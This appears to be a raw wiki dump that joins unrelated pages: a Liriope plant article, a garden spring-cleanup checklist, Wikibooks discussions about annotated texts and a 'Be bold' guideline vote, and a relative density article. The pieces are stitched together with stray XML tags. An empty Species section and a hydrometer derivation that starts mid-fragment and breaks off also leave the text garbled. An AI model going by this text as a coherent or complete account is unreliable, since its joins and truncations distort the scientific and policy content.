'''Liriope''' is a genus of low, grass-like, flowering plants from East Asia. Some species are often used in landscaping in temperate latitudes. They often called lilyturf in North America, though they are often simply referred to as &quot;Liriopes&quot;. Once classified with lilies in the family Liliaceae, genetic studies have caused the genus to be included in Ruscaceae.

==Description==
Liriopes are grass-like, rhizomatous perennials with broad, strap-like leaves. Flowers are borne on thin scapes, generally at about the same height as the foliage.

==Growing conditions==
Full sun to medium shade. Drought tolerant.

==Species==
&lt;!--general discussion or bulleted list--&gt;

==Uses==
Liriope are usually used in the garden for their evergreen foliage. 

Some species, e.g., L. spicata, grow aggressively in the right conditions, spreading by runners; hence their nickname, &quot;creeping lilyturf&quot;.

Liriope spicata is used as a substitute for Ophiopogon japonicus in Chinese medicine as an herb for yin deficiency&lt;ref&gt;Chinese Herbal Medicine Materia Medica  Third Edition by Daniel Bensky, Steven Clavey, Erich Stoger and Andrew Gamble.  Eastland Press, 2004&lt;/ref&gt;.

Spring cleanup is among the busiest times in the garden, involving both cleaning up anything that wasn't taken care of in the [[../Fall Cleanup|fall cleanup]], as well as getting the garden ready for the new season.

Step one - checkup:

*Lawn
**Check for broadleaf weeds, unwelcome grasses, bare spots
*Garden Beds
**Check for early weeds, perennials in need of cutback, bare spots needing filling, low spots, etc.
*Trees and Shrubs
**Broken/dead limbs
*Soil and drainage issues
**gullies, puddles, etc.

Step two - cleanup:
*Lawn
*Garden Beds
*Trees and Shrubs
*Soil and drainage

      <text xml:space="preserve">==Annotated sources v. Wikisource (first discussion moved from Staff Lounge)==
All the contents for Shakespeare's plays and the Sherlock Holmes stories have been copied to Wikisource, which is the place for such things.  These could now be deleted from this project, perhaps leaving a temporary link to Wikisource on the Main Page. [[User:Eclecticology|Eclecticology]] 18:04, 3 Dec 2003 (UTC)

:We plan to annotate those texts, so no thanks. When MediaWiki gets the ability to export Wikisource content to other projects, then we will delete our local copies. --[[User:Maveric149|mav]] 19:09, 3 Dec 2003 (UTC)

'''Another annotation question''':

Is the following the case: (1) Wikibooks is planning to have annotated texts, but (2) none of the texts at [[Annotated works]] is actually annotated yet. (Or, wait. The constitution seems to be annotated, but in a really crappy way.)(3) There is not now but at some point in the future ''will be'' a &lt;note&gt; tag for annotations?

If so, is it reccomended that people put the texts in place but do not annotate them until more infrastructure is in place, that they wait to put the texts in until the infrastructure is in place, or that they use some intermediate annotation scheme until the infrastructure is in place?

(Sorry if these questions are addressed elsewhere, and I didn't see.) [[User:Kukkurovaca|???????????]] 03:52, 19 Apr 2004 (UTC)

: Depends on the work, really. If it's like source text, put the text at Wikisource, and then when you want to annotate it, copy the text from Wikisource over... [[User:Dysprosia|Dysprosia]] 04:35, 19 Apr 2004 (UTC)
::Hmm. But if, say, I've started wikifying it, even though I can't annotate yet...(see [[User:Kukkurovaca]])[[User:Kukkurovaca|???????????]]
::: It wouldn't be so hard to strip the wikiformatting and the line numbers, if that's what you want? [[User:Dysprosia|Dysprosia]] 06:02, 19 Apr 2004 (UTC)
::::No, I'm suggesting I'm impatient. (smile)[[User:Kukkurovaca|???????????]]

::: If you want to upload, that should be fine. There's not many strict guidelines here, so if you go ahead, you won't be shot down, drawn and quartered ;) [[User:Dysprosia|Dysprosia]] 06:35, 19 Apr 2004 (UTC)
::: BTW if you do want to strip the Wikitext, put the text in an editor like vi and do &lt;tt&gt;:%s/^# //g&lt;/tt&gt;, &lt;tt&gt;:%s/\[\[.*|\(.*\)\]\]/\1/g&lt;/tt&gt; [[User:Dysprosia|Dysprosia]] 06:48, 19 Apr 2004 (UTC)

==&quot;Annotated works&quot; and &quot;Study guide bookshelf&quot; (second discussion moved from Staff Lounge)==
As some users have previously noted on the relevant talk pages, we have a confusing situation where there is one page for [[Annotated works]], a different page one somewhat duplicating it called &quot;Study guide bookshelf&quot; plus a template appearing on the Wikibooks main page that combines the two of them in its title, called [[Template:Study guide bookshelf|Study guide bookshelf]] (the title appearing on the Main Page is: &quot;[[Annotated Texts]] and [[Study Guides]]&quot;).

I strongly propose doing one of two things:
*Combining the two groups on the very same page and finding a single title that adequately describes what found in both of them.
*Dividing them into two clear groups, with two different templates as well.

Personally, I favor the second option. I think much of the confusion has resulted because, on the one hand, there are classic works of literature with planned annotation, while on the other hand, there are test preparation guides in this category (like the SAT study guide).

My suggestion: One page+category with template entitled: &quot;Annotated Texts&quot; and a second page+category with template entitled &quot;Test study guides.&quot;

What do people think? [[User:Dovi|Dovi]] 12:54, 23 Mar 2005 (UTC)

: I agree, it is one of the next points for cleaning up. Did you notice that most of the so-called &quot;Annotated Texts&quot; are actually not annotated at all? As such, they should move to Wikisource, and there are not many books left there. I'd suggest the following: Combine the two bookshelves (since each of them is comparatively small), getting rid of &quot;Annotated texts&quot; (for now move the books to Study guides, subsection Annotated texts, but it seems most of them are there already anyway). Annotated texts is a nice idea, but it does not require a bookshelf by its own, unless it grows bigger.
: B.t.w. I would suggest to put all Study guides of classical work into the (new) study guide namespace &quot;Studyguide:Romeo and Juliet&quot;, etc. to clean things up, but that is a follow-up project. For now, I support the idea of getting rid of &quot;Annotated texts&quot; and having only one bookshelf. --[[User:Andreas Ipp|Andreas]] 13:18, 23 Mar 2005 (UTC)

::Suggestion for cleaning up sounds good to me. As for &quot;Studyguide&quot; namespace, please explain how it is meant to be used. Would it have to be used for every page of a study guide? (That would seem cumbersome.)[[User:Dovi|Dovi]] 21:03, 23 Mar 2005 (UTC)

::: There should be a clever standard behind this: Some people feel like it would be wise to put the words &quot;Study guide&quot; somehow into the title. People are just not sure about how to do this:
 [[Study Guide:Shakespeare|'''Study Guide''':Shakespeare]]
 [[A Tale of Two Cities/Study guide/Characters|A Tale of Two Cities/'''Study guide'''/Characters]]
 [[Study Guide for CFA Exam Level 1|'''Study Guide''' for CFA Exam Level 1]]
::: So things could be unified by a namespace that covers all these books, either &quot;Study Guide:&quot;, &quot;Study guide:&quot; or &quot;Studyguide:&quot; or the like (it should be just consistent). Of course, if we decide on using a namespace, then all pages and all subpages have to use it.
::: If you feel your book [[Mishnah]] does not require the words &quot;Study guide&quot; in the title (because it is not meant as a study guide to Mishnah but the purpose is the text itself), then you don't have to use this namespace. For other books, a unique namespace would make sense. --[[User:Andreas Ipp|Andreas]] 10:24, 24 Mar 2005 (UTC)

Hmmmm, interesting. Could you refer me to whatever discussion already exists on the namespace and its use, so that I can better understand it?
(Offhand, it would seem to me that categories would do the job less intrusively. That plus tight interconnection between the various parts of the text.)

As far as [[Mishnah]] goes - it really is meant to be an &quot;Annotated text&quot; - i.e. the actual text in a useful form '''plus''' the creation of new study aids (introductions, notes, summaries...) to assist the reader.[[User:Dovi|Dovi]] 13:02, 24 Mar 2005 (UTC)

: Unfortunately I don't know of any discussion on the use of namespaces (other than the one we two are having right here.) You see, I would not call a book &quot;A tale of two cities&quot; if it is meant to be a study guide, because that is a book written by Charles Dickens. The book should be rather called &quot;Study guide to 'A tale of two cities'&quot; or shorter &quot;Study guide:A tale of two cities&quot;. That ''Study guide'' appears in this case in the title has nothing to do with in what category I will put the book later.
: It will probably be a broader discussion, since the cleanest way would be to put original work to [http://wikisource.org/wiki/Main_Page:English Wikisource], and a book about the book (with links to the relevant passages) on Wikibooks.(This would be also the cleanest for the reader, since he knows immediately which parts are original and which are added by other contributors). But people are not so clean in this distinction (see [[The Golden Bough]] or [[Gardening]] for original work that made it into Wikibooks, meant to be edited later by someone else - but noone dared to do so yet). --[[User:Andreas Ipp|Andreas]] 10:55, 30 Mar 2005 (UTC)
::Hi, sorry I've been away for a while! I think your distinction, while a good &quot;clean&quot; one, does not address all of the possibilities. Specifically, it leaves no place for Charles Dickens with introductions, commentary, and notes. What you mean by &quot;study guides&quot; to texts are meant to stand ''on their own'', as ''companion'' volumes (i.e. the Wikibooks study guide to Charles Dickens as a companion to the Wikisource original text). However, there is yet another genre, one that ''includes'' the object of study (the original text), ''within'' the study guide. That is better called an &quot;annotated text.&quot; I think this is what the person working on &quot;Golden Bough&quot; wants to do eventually, and it is what I've also tried to do with initial samples of Mishnah. This kind of project can legitimately (and usefully) be called by the actual title of the book.
::I don't think there's any real problem, by the way, if Charles Dickens or Shakespeare sit here for a long time until someone decides they want to annotate them. That's the nature of wiki: people do it when they want to!
::One last point: When we talk about the &quot;original text&quot; of Charles Dickens (to be kept on Wikisource), everyone knows pretty much exactly what is meant by that. However, when dealing with pre-modern texts it is much less clear. ''Any'' edition of a text from ancient or classical times involves a huge number of editorial decisions regarding textual criticism, formatting, puctuation, and numerous other details, often subjective decisions which can turn even the &quot;original text&quot; into a somewhat new creation. Here is where the border between Wikibooks and Wikisource becomes blurred. (I would suggest that an ''exact'' representation of a previously published edition of a classical text be held on Wikisource, while a digital version meant to incorporate ''new'' editing features be held here.)

I don't think this should be a policy. I'm indifferent as to whether it should be an ''official'' or ''unofficial'' guideline, [[User:Jguk|Jguk]] 21:39, 21 December 2006 (UTC)

Please read the text from &amp;#123;{[[Template:policy|policy]]{{#if:{{{param|}}}|&amp;#124;{{{param|}}}}}}}. ''Policies are rules and principles that the Wikibooks community has accepted and wikibookians must follow.'' Why must I follow this if it were nominated to be a policy? What if I were a new and timid editor who justed wanted to act as a [[w:wikignome|wikignome]] while I learn the loops and strings? To require this a policy which Wikibookians '''''must''''' follow is absolutely ludicrous. You can't legislate morals, you can't legislate values, and you definitely cannot enforce them. --[[User:Iamunknown|Iamunknown]] 10:47, 23 December 2006 (UTC)

:I agree with both the above - unofficial guideline maybe but certainly not policy --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 11:56, 23 December 2006 (UTC)

:There is currently mention of &quot;being bold&quot; as being an encouraged behavior in the decision making guideline. If we can turn that into a policy, then technically we can just let this be a policy. However, I would like to point out that '''be bold''' is a common mantra in wikimedia project, and we would like to encourage the behavior. Furthermore, I think there should be some kind of protection in place for the people who actually are bold, so that other people don't complain and say &quot;That a-hole was too bold&quot;, or even &quot;On this page, people arent allowed to be bold.&quot; Finally, I would like to point out that this page says &quot;Wikibookians are '''encouraged''' to be bold&quot;, not &quot;mandated&quot; or anything like that. The policy basically says that boldness should be welcomed and encouraged as a matter of policy, but that being bold is something that people may do at their own discretion. I think that we absolutely should encourage it and protect it. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 15:53, 23 December 2006 (UTC)

:: I fully agree that Wikibookians should be bold and that Wikibookians who are bold should not be complained about. I agree that Wikibookians should ''be encouraged'' to be bold. They should not, under any circumstance, however, ''be required'' to be bold. A policy is specifically &quot;...rules and principles that the Wikibooks community has accepted and wikibookians '''''must follow'''''.&quot; I disagree. I think that Wikibookians '''''should follow''''' the ideas outlined in this text; thus I think this text should be a guideline.
:: Furthermore, as the text stands now, there is no protection for bold Wikibookians mentioned. I am unsure if it would be appropriate to include it here. It could, however, be included in [[Wikibooks:Be civil]], with an appropriate ''see also'' link at the bottom of this page.
:: I will try my hand at it sometime later, unless someone beats me to it. Cheers, [[User:Iamunknown|Iamunknown]] 01:05, 24 December 2006 (UTC)

:: I also agree that this should be a guideline, it still misses a very important topic that are changes in format and structure, those changes shouldn't be protected by the be bold directive, that type of changes should be addressed by a formal proposal if there are other users active on the book (or if it isn't stale). --[[User:Panic2k4|Panic]] 00:34, 3 January 2007 (UTC)

:::Everything should be protected by this guideline. The mandate isn't &quot;be bold, except when you shouldnt be&quot;, or &quot;be bold unless other people are looking&quot;. All wikibookians are always encouraged to take initiative to make the project better. We shouldnt limit or restrict that. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 20:07, 9 January 2007 (UTC)

== official vs unofficial ==
Were can I find information on the differences on a official and unofficial guidelines ? (policies are always official , right ?) --[[User:Panic2k4|Panic]] 00:34, 3 January 2007 (UTC)

:You're expected to follow official guidelines unless you can show a bloody good reason not to - they will have community consensus. Unofficial guidelines have persuasive force only - they will not necessarily have community consensus, but have not been rejected. [[User:Jguk|Jguk]] 13:20, 9 January 2007 (UTC)

:: Where can one find the unofficial list of guidelines ? Or are you referring to guidelines and policies that didn't yet come to a &quot;vote&quot;/close ? --[[User:Panic2k4|Panic]] 17:13, 9 January 2007 (UTC)

:::There is no such distinction between &quot;official&quot; and &quot;unofficial&quot; guidelines. The only things that are recognized are &quot;policy&quot;, &quot;guideline&quot;, and  &quot;proposal&quot;. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 20:05, 9 January 2007 (UTC)

:::: That was my understanding, but people continue to refer to unofficial guidelines/policies. --[[User:Panic2k4|Panic]] 20:08, 9 January 2007 (UTC)

::::: There are a number of ''de facto'' rules around here, things that people do just because we've always done them. I believe that unless something is written and &quot;official&quot;, that people should have the freedom to do whatever they want. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 20:18, 9 January 2007 (UTC)

I'm afraid I must disagree with Whiteknight here. Some policies apply even though they have not been written up. For example, I believe that when the ''[[Wikibooks:Be civil|Be civil]]'' policy was moved to enforce, it didn't create a new policy or change the way we do things in any way. Instead it just wrote down what the policy already was.

&quot;Unofficial&quot; is perhaps an unfortunate term. They don't have any formal force, but they will represent the views of the people who have written them. On Wikibooks, we do always tend to listen to people's views before taking a course of action, but that doesn't mean that we all always agree on which course of action is best. It's a judgment call as to how much weight, if any, to give to an &quot;unofficial&quot; guideline in any particular circumstance. However, I do believe that as long as you act reasonably, no-one will mind too much, even if it contradicts an &quot;unofficial&quot; guideline.

Maybe, in the light of the above, we should remove the term &quot;unofficial guideline&quot; and replace it with something like &quot;discussion&quot; or &quot;user's essay&quot;.

It is, of course, only &quot;official&quot; policies and guidelines that need to be followed - but don't necessarily assume that they are all written down somewhere - some are just the customs which the current Wikibookians generally all adhere to. [[User:Jguk|Jguk]] 21:07, 9 January 2007 (UTC)

:I had mentioned trying to do &quot;comunity statements&quot; at some point... this would qualify for that. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 21:24, 9 January 2007 (UTC)</text>

      <text xml:space="preserve">Please review the [http://en.wikibooks.org/w/index.php?title=Wikibooks:Be_bold&amp;oldid=805443 policy under discussion] before voting.

== Introduction ==

This is largely a copy of the general philosophy that has been expressed on Wikipedia, but this is an attempt to put it into context here on Wikibooks.

== Key Points ==

* If something needs to be fixed, do it!  Sitting around in committee and discussing how something should be done often means that nothing actually gets done.  Somebody needs to step up and try some things, even if others may not agree.  Most actions on Wikibooks are reversible as well, so if it doesn't quite work out, it can be undone by others.

* Don't be reckless.  You can go overboard and start making so many changes that serious objections are raised.

== Votes ==

*Only registered users with at least 20 edits can vote. 
*Vote ends at April 20th, 2007 00:01 GMT 
*Add votes in the format '''&lt;nowiki&gt;#~~~~&lt;/nowiki&gt;'''

== Support, as a guideline ==

*[[meta:polling is evil|Votes do not garner consensus; they may or may not indicate an existing consensus]]. If consensus already exists, as it appears it does, then it should be a guideline. --[[User:Iamunknown|Iamunknown]] 01:41, 26 March 2007 (UTC)

:*Comment - I agree with you in that voting is not required but it is what is stated on the decision making process (so we must use it or state a valid objection to break it), a call for objections is all it is really needed in most cases, I'm 100% behind you on that, see if you can express that in the draft of the WB:DMP to be approved... (btw take a look into [[User:Panic2k4/Decision_making_and_Community_consensus_on_Wikibooks]] it is still under work Xixtas raised some valid points that still needs to be addressed.) --[[User:Panic2k4|Panic]] 02:22, 26 March 2007 (UTC)

:I do see a benefit of a &quot;forced vote&quot; like this so far as when a policy seems to have achieved a certain level of concensus, a vote like this is often a way to bring it to the attention of a larger group of individuals and perform the final last minute tweaks to the proposal or to voice objections that otherwise wouldn't have been raised.  The vote about [[meta:Wikiversity/Vote|Wikiversity on Meta]] is an excellent example of this, and certainly forced the hand of the WMF to at least acknowledge that there was significant support for the idea.  It is rare for a vote to actually gain concensus, and I would have to agree that if there is significant disagreement, that any voting ought to be closed and the proposal reworked.  This does give legitimacy to policy decisions to show that a proposal or policy does have the support of much more than one or two administrators.  --[[User:Robert Horning|Rob Horning]] 07:51, 26 March 2007 (UTC)

::Humm what about a making it a call for review (where a minimum number of users signed as being informed), this would remove the negatives aspects for a poll and address the important concerns you raised, no ?  --[[User:Panic2k4|Panic]] 16:33, 26 March 2007 (UTC)

::I agree with Panic; a discussions is much more meaningful. A vote creates a dichotomy (&quot;yea&quot; or &quot;nay&quot;) where there simply is none. A policy or guideline is a subtle document; a person may disagree with one clause or ''one word'' and be forced to choose between &quot;yea&quot; or &quot;nay&quot; in a vote, whereas he or she could discuss with other people his or her concerns if a discussion were held. At the end of the discussion, if the majority felt it were necessary to vote, I would vote, but I feel there has been little contemporary discussion at least concerning this document and thus I abstain pending further discussion. --[[User:Iamunknown|Iamunknown]] 16:48, 26 March 2007 (UTC)

:::The question here is how do you &quot;ratify&quot; or &quot;make official&quot; some sort of policy document?  In the case of this document (and others here on Wikibooks) the editing and discussion went on for some time, has been cited in numerous other discussions, and has achieved a sort of ex-officio status.  Other significant policies that have gone through this exact process have been the [[Wikibooks:Deletion policy|Deletion Policy]] and [[WB:NP|Naming Policy]].  Both were hotly debated, and achieved a level of concensus within the group of users that was developing the policies, but for many months (a great many) these policies were cited in VfD discussions and in the Staff Lounge.  Yet the &quot;proposed policy&quot; statement was listed during this whole time.  In the case of the Naming Policy, it was strongly felt that we needed to establish some sort of formal policy that had achieved a level of acceptance before some significant reorganization of Wikibooks took place.  The lack of authoritative policy on these matters significantly tied the hands of admins who wanted to enforce these concepts.

:::The opposite to this process of voting is instead something is simply &quot;declared&quot; as enforced policy, with only the insular group who wrote the policy in the first place being the ratifying authority.  I see that this has occured with [[Wikibooks:Administrators]], where I have raised some significant objections to some of the passages after the fact.  Indeed, with this policy I don't even know what the &quot;ratifying&quot; authority on it really was.  I see that four users agreed with the idea, and barring nobody else monitoring the talk page it was moved to enforced policy.  In my opinion, such an &quot;enforced&quot; policy doesn't carry nearly so much &quot;official&quot; weight as the deletion policy and naming policy.  It is precisely this sort of behind the scene ratification process that I want to very much avoid.  Making new policies needs to be out in the open and as transparent as possible.

:::BTW, the reason I set the date for closing this vote (which was prematurely closed by Darklama) as being a couple of weeks out was to make sure that the whole Wikibooks community had a chance to see this policy before some sort of &quot;official&quot; action occurred.  As can be seen from my efforts and objections on the Administrators' policy, objections after a policy becomes &quot;official&quot; tend to be ignored or rationalized, instead of compromises to the policy worked into the text.  --[[User:Robert Horning|Rob Horning]] 17:40, 26 March 2007 (UTC)

::::Another point that must be kept in mind is that this is a dynamic process we aren't voting on a static text but the closing of decission, to be fair, must address a fixed text or proposal, a limit on editing prior to closing a discussion should be implemented in the future.

This guideline is pretty stable and fundamental as someone said before (on the talk page), I'm surprised it wasn't already official since it gets cited all the time. [[User:Mattb112885|Mattb112885]] &lt;small&gt;([[User talk:Mattb112885|talk]]) &lt;/small&gt; 21:37, 24 March 2007 (UTC)

:Good idea that this is put into policy. So when do we get to vote for [[Wikibooks:Assume good faith|assume good faith]]? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 22:34, 25 March 2007 (UTC)
::I have done some editing to it (since you have mentioned it) it seems to be yet to verbose (and restate things that are on other approved or to be approved texts), it can even have some of it removed and substituted by references to BeBold.  --[[User:Panic2k4|Panic]] 02:24, 26 March 2007 (UTC)

I went ahead and made it a guideline, since its been defacto guideline here a very long time and there have been no opposed votes. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 15:47, 26 March 2007 (UTC)

:That seems to be a bit hasty, but I'm not going to seriously object here.  Of course, that is also '''being bold''' by doing that sort of action :)  --[[User:Robert Horning|Rob Horning]] 15:55, 26 March 2007 (UTC)

'''Re: Voting'''. I agree in the sense that voting shouldn't be the only step in the process. I would like to suggest that in the future we first have a discussion opened as a precursor to any formal poll. Perhaps under a heading of &quot;Questions and Concerns&quot; and give everyone a week or more to discuss the finer points of the proposal. I think voting is a necessary part of the process online of decision-making online. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 22:03, 26 March 2007 (UTC)

:I could support this.  By using such a simply policy to illustrate to the current generation of Wikibooks users how this process has occurred in the past, this really was more of a demonstration to get things moving.  When the unstable version of [[WB:WIW]] comes up for discussion, we had better be able to agree upon a process for validating that policy or we will completely split apart this community.  I hope this can be useful in helping form such a process.  Besides, this page also accomplished rather quickly the task of trying to move a proposed policy to some sort of enforced state.  I'm not trying to stir up a hornet's nest here.  --[[User:Robert Horning|Rob Horning]] 23:10, 26 March 2007 (UTC)

:: I also think it's a good idea to implement something for discussion, though I think that we should use something else as a guinea pig for the new process besides WIW since as Rob said it's likely to cause lots of rumblings if we don't have any organized manner we can agree on for discussion. Maybe the [[wikibooks:Fair use policy|Fair Use Policy]] would be a good place to start? However, maybe we should just say we're doing discussions on the talk page, and then reserve these pages just for voting-related things, after all that's what the talk pages are for. Unless we'd use that for less formal discussion and these pages for more formal discussions? Would it be useful to have two discussion pages for the same policy?

'''Relative density''' is a dimensionless ratio of the densities of two materials.  The term '''specific gravity''' is similar, except that the reference material is water.  A relative density can help quantify the buoyancy between two materials, or determine the density of one &quot;unknown&quot; material using the &quot;known&quot; density of another material.  Mathematically, relative density is expressed as:
:&lt;math&gt;
G = \frac{\rho_\mathrm{object}}{\rho_\mathrm{reference}}\,
&lt;/math&gt;

where &lt;math&gt;G&lt;/math&gt; is the relative density, and &lt;math&gt;\rho&lt;/math&gt; is the densities of the two materials in the same units (e.g., kg/m³, g/cm³).

Relative density is dimensionless, since it is a ratio between two quantities of same unit. If the ratio is greater than 1, the ''object'' will be heavier than the same volume of the ''reference''.  If it is less than 1, it will be lighter than the ''reference''.  It is important to specify the reference material when reporting a relative density, but when the reference material is not specified it is usually understood to be water at 3.98 ° C. &lt;!-- Citation help is here http://www.google.com/search?&amp;q=Wetzel+3.98+Density-of-water --&gt; {{Fact|date=March 2007}}

==Specific gravity==
Using water as a reference material can make the calculations using SI units convenient, since density of water is (approximately) 1000&amp;nbsp;kg/m³ or 1&amp;nbsp;g/cm³. Determining the specific gravity (same as relative density of an object relative to water) entails little effort, as the density of the object only needs to be divided by 1 or 1000, depending on the unit, e.g.:
:&lt;math&gt;
G = \frac{\rho_\mathrm{object}}{\rho_\mathrm{H_2O}}
 = \frac{\rho_\mathrm{object}\ \mathrm{kg/m^3}}{1000\ \mathrm{kg/m^3}}
 = \frac{\rho_\mathrm{object}\ \mathrm{g/cm^3}}{1\ \mathrm{g/cm^3}}\,
&lt;/math&gt;

===Unitless properties of specific gravity===
{{main|Dimensionless quantity}}

While it may seem that this would result in two different specific gravities based upon which unit is used, this is not the case.  Consider an object with a density of &lt;math&gt;4\ \mathrm{g/cm^3} &lt;/math&gt;.  According to the above formula, the specific gravity of this object would be 
:&lt;math&gt;
G = \frac{\rho_\mathrm{object}}{\rho_\mathrm{H_2O}}
 = \frac{\rho_\mathrm{object}\ \mathrm{g/cm^3}}{1\ \mathrm{g/cm^3}}
 = \frac{4\ \mathrm{g/cm^3}}{1\ \mathrm{g/cm^3}}\,
 = 4&lt;/math&gt;

Convert this object into &lt;math&gt; \mathrm{kg/m^3} &lt;/math&gt;.  The density of this object is:
:&lt;math&gt;
\rho_\mathrm{object}=4\frac{\mathrm{g}}{\mathrm{cm^3}}*\frac{1\ \mathrm{kg}}{1000\ \mathrm{g}}*\frac{100^3\ \mathrm{cm^3}}{\mathrm{m^3}}
 = 4*1000 \frac{\mathrm{kg}}{\mathrm{m^3}} = 4000 \frac{\mathrm{kg}}{\mathrm{m^3}}\,
&lt;/math&gt;

Hence the specific gravity of this object is:
:&lt;math&gt;
G = \frac{\rho_\mathrm{object}}{\rho_\mathrm{H_2O}}
 = \frac{\rho_\mathrm{object}\ \mathrm{kg/m^3}}{1000\ \mathrm{kg/m^3}}
 = \frac{4000\ \mathrm{kg/m^3}}{1000\ \mathrm{kg/m^3}}\,
 = 4&lt;/math&gt;

Since the specific gravity is, in fact unitless, as long as the same reference is used and consistent units are used the specific gravity will be the exact same number.  Hence specific gravity will also work with gravitational density instead of mass-based density.  Calling the gravitational density of an object &lt;math&gt;\gamma_\mathrm{object} = \rho_\mathrm{object}g_\mathrm{local}&lt;/math&gt;; where &lt;math&gt;g_\mathrm{local}&lt;/math&gt; is the the local gravitational constant...
:&lt;math&gt;
G = \frac{\rho_\mathrm{object}}{\rho_\mathrm{H_2O}}
 = \frac{g_\mathrm{local}\ \mathrm{N/kg}\ \rho_\mathrm{object}\ \mathrm{kg/m^3}}{g_\mathrm{local}\ \mathrm{N/kg}\ \rho_\mathrm{H_2O}\ \mathrm{kg/m^3}}
 = \frac{\gamma_\mathrm{object}\ \mathrm{N/m^3}}{\gamma_\mathrm{H_2O}\ \mathrm{N/m^3}}\,
&lt;/math&gt;

===Difference between specific gravity and relative density===
Specific gravity is a special case of relative density.  While specific gravity has a '''reference density''' of water, relative density can have any reference density that is used.  It is best to specify the reference material when using relative density, using subscripts:
:&lt;math&gt;
RD_\mathrm{Object/Reference} \,
&lt;/math&gt;

Which states &quot;the relative density of the object with respect to the reference material&quot;.

While relative density will not change as long as consistent units are maintained, the relative density is relative to its reference.  The relative density of an object relative to mercury, is diffirent then the relative density with respect to water (specific gravity).

Taking the relative density with respect to alcohol, the water has a specific gravity of 1.2, and the iron has a specific gravity of 10.  Taking the relative density relative to water, the numbers would be .78, 1, and 7.9.  With respect to iron, the numbers are .1, .12, and 1.  These are all correct relative densities, however it is with different reference points. Note that again, units are not needed and hence these numbers are correct no matter what unit system is used.

===Practical uses of the unitless properties of relative density===
Maintaining a consistent set of units is important.  The units do not need to even be in terms of &quot;amount of substance&quot; per &quot;volume&quot; directly.  For example, suppose someone wanted to find out the specific gravity of a rock.  They could see that the rock deflected a certain spring by 3 inches.  Then they put on a reference substance, which deflected the spring by 5 inches.  The first rock made the water in a certain graduated cylinder rise by 20 mm, and the reference made it rise by 34 mm.  The relative density between these two objects can easily be determined without having to figure out several constants which would be needed to determine the density directly (like the spring constant or the cross sectional area of the cylinder).

Since they know that the density of each object would be:
:&lt;math&gt;
\rho_\mathrm{object}=\frac{Mass}{Volume}
 = \frac{Deflection*Spring\ Constant*Gravity}{Displacement_\mathrm{Water Line} * Area_\mathrm{Cylinder}}\,
&lt;/math&gt;

Then the relative density is:
:&lt;math&gt;
RD=\frac{\rho_\mathrm{object}}{\rho_\mathrm{H_2O}}
=\frac{\frac{Deflection_\mathrm{Obj.}*Spring\ Constant*Gravity}{Displacement_\mathrm{Obj.} * Area_\mathrm{Cylinder}}}
{\frac{Deflection_\mathrm{Ref.}*Spring\ Constant*Gravity}{Displacement_\mathrm{Ref.} * Area_\mathrm{Cylinder}}}\,
&lt;/math&gt;
:&lt;math&gt;
RD=\frac{\frac{Deflection_\mathrm{Obj.}}{Displacement_\mathrm{Obj.}}}{\frac{Deflection_\mathrm{Ref.}}{Displacement_\mathrm{Ref.}}}
 = \frac{\frac{3\ \mathrm{in}}{20\ \mathrm{mm}}}{\frac{5\ \mathrm{in}}{34\ \mathrm{mm}}}=\frac{3\ \mathrm{in} * 34\ \mathrm{mm}}{5\ \mathrm{in} * 20\ \mathrm{mm}} = 1.02\,
&lt;/math&gt;

Now if they knew the actual density of the reference substance, then they can find the actual density of the test object.  In this example, the density of the reference substance is 300000 N/inch³ (which would be absurd, but shows the power of the RD system).  Then the density of the test substance is 300000 N/in³ * 1.02 = 306000 N/in³.

==Temperature dependence==
:''See Density for a table of the measured densities of water at various temperatures.''

Changes in temperature affect the densities of materials, and the relative densities between two materials need to be corrected at certain temperatures.  It is best to record the temperatures of the two materials, expressed here:
:relative density: &lt;math&gt; 8.15_{4^\circ \mathrm{C}}^{20^\circ \mathrm{C}} \,&lt;/math&gt; or specific gravity: &lt;math&gt; 2.432_0^{15} &lt;/math&gt;
where the superscript indicate the temperature at which the density of the material is measured, and the subscripts indicate the temperature of the water to which it is compared.

==Relative density and hydrometers==
One important use of relative density is hydrometers.  It is relatively easy to show that the displacement of a hydrometer is approximately directly proportional to the change of relative density for small changes with respect to any reference that the hydrometer is placed into.

local gravitational constant. 

Since the hydrometer is in static equilibrium, this force is equal to the gravitational force pulling down on the hydrometer, or &lt;math&gt;mg \,&lt;/math&gt;, where &lt;math&gt;m \,&lt;/math&gt; is the mass of the entire hydrometer.  Hence:
:&lt;math&gt;mg = \rho_\mathrm{Ref.} V_\mathrm{red} g \,&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(1)&lt;/div&gt;
:&lt;math&gt;m = \rho_\mathrm{Ref.} V_\mathrm{red} \,&lt;/math&gt; &lt;div align=&quot;right&quot;&gt;(2)&lt;/div&gt;
